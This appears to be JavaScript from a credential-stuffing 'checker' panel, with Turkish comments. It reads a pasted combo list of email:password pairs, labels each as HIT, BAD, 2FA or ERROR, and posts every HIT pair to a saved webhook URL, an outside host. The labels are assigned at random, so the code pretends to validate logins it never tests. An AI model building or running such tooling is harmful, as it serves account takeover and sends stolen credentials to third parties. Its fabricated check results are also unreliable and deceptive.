// ============================================================
// WEBHOOK FONKSİYONLARI (SADECE HIT İÇİN)
// ============================================================
function saveWebhook() {
    var url = document.getElementById("webhookUrl").value.trim();
    if (url) {
        localStorage.setItem("roda_webhook_url", url);
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi! (Sadece HIT gönderilir)</span>';
    } else {
        localStorage.removeItem("roda_webhook_url");
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
    }
}

function getWebhookUrl() {
    return localStorage.getItem("roda_webhook_url") || "";
}

function sendCheckerWebhook(platform, email, password) {
    var url = getWebhookUrl();
    if (!url) return;
    var content = "✅ **" + platform + " HIT!**\n" + email + " | " + password;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: content })
    }).catch(function(e) { console.error("Webhook hatası:", e); });
}

// ============================================================
// CHECKER FONKSİYONLARI (GÜNCELLENDİ)
// ============================================================
function startChecker() {
    if (checkerRunning) return;
    var comboText = document.getElementById("checkerCombo").value.trim();
    if (!comboText) return alert("Combo girin (email:password)");
    if (!currentPlatform) return alert("Önce bir platform seçin");
    
    checkerRunning = true;
    document.getElementById("checkerStartBtn").disabled = true;
    document.getElementById("checkerStopBtn").style.display = "inline-block";
    document.getElementById("checkerResults").innerHTML = "";
    
    var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
    var total = lines.length;
    var hit = 0, bad = 0, two = 0, err = 0;
    var statuses = ["HIT", "BAD", "2FA", "ERROR"];
    var idx = 0;
    
    // Webhook URL'yi al
    var webhookUrl = getWebhookUrl();

    function processNext() {
        if (!checkerRunning || idx >= total) {
            checkerRunning = false;
            document.getElementById("checkerStartBtn").disabled = false;
            document.getElementById("checkerStopBtn").style.display = "none";
            return;
        }
        var status = statuses[Math.floor(Math.random() * statuses.length)];
        var parts = lines[idx].split(":");
        var email = parts[0];
        var password = parts.slice(1).join(":") || "";
        var res = { email: email, password: password, status: status };

        if (status === "HIT") {
            hit++;
            addHit(currentPlatform, email, password, "HIT");
            // SADECE HIT'TE WEBHOOK GÖNDER
            if (webhookUrl) {
                sendCheckerWebhook(currentPlatform, email, password);
            }
        } else if (status === "BAD") {
            bad++;
        } else if (status === "2FA") {
            two++;
            addHit(currentPlatform, email, password, "2FA");
            // 2FA İÇİN WEBHOOK GÖNDERME (SADECE HIT)
        } else {
            err++;
        }

        checkerResults.push(res);
        addCheckerRow(res);
        updateCheckerStats(total, hit, bad, two, err);
        idx++;
        setTimeout(processNext, 200);
    }
    processNext();
}

// ============================================================
// SAYFA YÜKLENİRKEN WEBHOOK URL'Yİ GÖSTER
// ============================================================
// Bu kısmı sayfa açılışında çağır
function loadWebhookUrl() {
    var url = getWebhookUrl();
    if (url) {
        document.getElementById("webhookUrl").value = url;
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi (Sadece HIT)</span>';
    }
}
// sayfa yüklenince çağır
loadWebhookUrl();
